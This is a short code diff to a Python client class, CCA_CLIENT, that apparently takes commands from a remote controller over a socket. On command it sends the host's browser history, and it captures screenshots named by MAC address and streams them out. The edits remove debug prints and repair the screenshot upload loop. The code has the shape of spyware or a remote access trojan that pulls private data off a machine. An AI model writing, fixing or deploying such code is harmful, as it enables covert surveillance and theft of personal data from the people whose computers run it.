@@ -41,7 +41,6 @@ class CCA_CLIENT:
                 sock.send(self.getHistory())
 
             elif command == "screenshot":
-                print('started scrn')
                 self.getScreenshot()
 
             elif command == "exitclient":
@@ -62,7 +61,6 @@ class CCA_CLIENT:
         return pickle.dumps(b_history)
 
     def getScreenshot(self):
-        print('started screenshot')
         img_array = np.array(ImageGrab.grab())
         img_path = os.path.join(LOCATION, f"scrn/{MAC_ADDRESS}_{self.getTS()}.npy")
         np.save(img_path, img_array)
@@ -70,10 +68,8 @@ class CCA_CLIENT:
         data = file.read(1024)
         sock.send(data)
         while data != b'':
-            print('sending...')
             data = file.read(1024)
-            sock.send(len(data))
-        sock.send(b'')
+            sock.send(data)
         print('[*] Screenshot sent successfully')
 
 
